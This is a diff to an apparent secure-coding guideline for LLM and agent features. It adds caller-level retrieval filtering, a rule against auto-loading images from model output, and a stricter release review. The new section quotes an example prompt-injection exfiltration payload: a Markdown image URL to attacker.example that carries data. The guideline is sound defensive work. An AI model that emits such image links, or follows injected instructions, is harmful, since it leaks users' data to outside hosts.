@@ -30,11 +30,15 @@ Run every tool or retrieval call with the caller's tenant/organization identity 
 
 ### Scope memory and retrieval by tenant
 
-Conversation memory, vector stores, and retrieval indexes hold tenant data. Partition them by tenant/organization and filter every lookup by the caller's identity from the request context; a retrieval query without a tenant filter is the same class of defect as a SQL query without one. Treat retrieved content as untrusted input to the model, per the first rule.
+Conversation memory, vector stores, and retrieval indexes hold tenant data. Partition them by tenant/organization, and filter every lookup by the caller's tenant from the request context and by the caller's own access to each document or record. A retrieval query without a tenant filter is the same class of defect as a SQL query without one, and a tenant filter alone still returns documents the caller cannot otherwise read. Treat retrieved content as untrusted input to the model, per the first rule.
 
 ### Confirm actions that change state or send data out
 
 Require explicit user confirmation before an action that changes state or sends data outside the tenant (an outbound request, an email, a message). Show the user the concrete action and its parameters, not the model's summary of it.
+
+### Do not auto-load remote content from model output
+
+Rendering model output can send data out with no user step. If an injected instruction makes the model emit a Markdown image such as `![](https://attacker.example/?d=<data>)`, the browser fetches the URL and delivers the data. When a UI renders model output, do not auto-load images or other remote resources from it: render them as text, or allow only hosts on an allow-list. Apply [URL attribute validation]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/general-recommendations-for-react-secure-coding/#url-attribute-validation) to links in model output. The [CSP target for Choreo Labs admin UIs]({{#base_path#}}/security-guidelines/secure-engineering-guidelines/secure-coding-guidlines/general-recommendations-for-react-secure-coding/#csp-target-for-choreo-labs-admin-uis) allows images from any `https:` host; on pages that render model output, narrow `img-src` to the same allow-list.
 
 ### Keep secrets and other tenants' data out of prompts
 
@@ -50,18 +54,19 @@ Pin and review third-party models, agent frameworks, and tool servers (for examp
 
 ### Release review
 
-Treat any feature that lets a model call tools or act on a user's behalf as a risky exception: route it through the Security and Compliance Team before release. Test it with the smoke tests in the prompt injection cheat sheet, including indirect injection through every content source the model reads.
+A feature that lets a model call tools or act on a user's behalf must be reviewed and approved by the Security and Compliance Team before release, as part of the design review in the [Secure Software Development Process]({{#base_path#}}/security-processes/secure-software-development-process/#design-phase). In the request, list the tools the model can call, the permissions each one runs with, and the actions that need user confirmation. Test the feature with the smoke tests in the prompt injection cheat sheet, including indirect injection through every content source the model reads.
 
 ## Review checklist
 
 When adding a feature that calls an LLM or runs an AI agent in a Choreo Labs product:
 
 - [ ] Model output reaches SQL, OS commands, HTML, redirects, and outbound requests only through the same validation and encoding as user input.
-- [ ] Every tool and retrieval call runs with the caller's identity and tenant from the request context, with no service-wide credential.
+- [ ] Every tool and retrieval call runs with the caller's identity and tenant from the request context and the caller's own permissions, with no service-wide credential.
 - [ ] The tool set is the minimum the feature needs; authorization is re-checked at the data layer.
-- [ ] Memory, vector stores, and retrieval indexes are partitioned and filtered by tenant.
+- [ ] Memory, vector stores, and retrieval indexes are partitioned by tenant, and every lookup is filtered by tenant and by the caller's access to each document or record.
 - [ ] Actions that change state or send data outside the tenant need explicit user confirmation.
+- [ ] The UI does not auto-load images or other remote resources from model output, except from allow-listed hosts.
 - [ ] No credentials or other tenants' data in prompts; logged prompts and responses are masked.
 - [ ] Token, tool-call, and iteration limits are set per request and per tenant.
 - [ ] Third-party models, agent frameworks, and tool servers are pinned and reviewed.
-- [ ] The Security and Compliance Team reviewed the feature before release.
+- [ ] If the model calls tools or acts on a user's behalf, the Security and Compliance Team approved the feature before release.
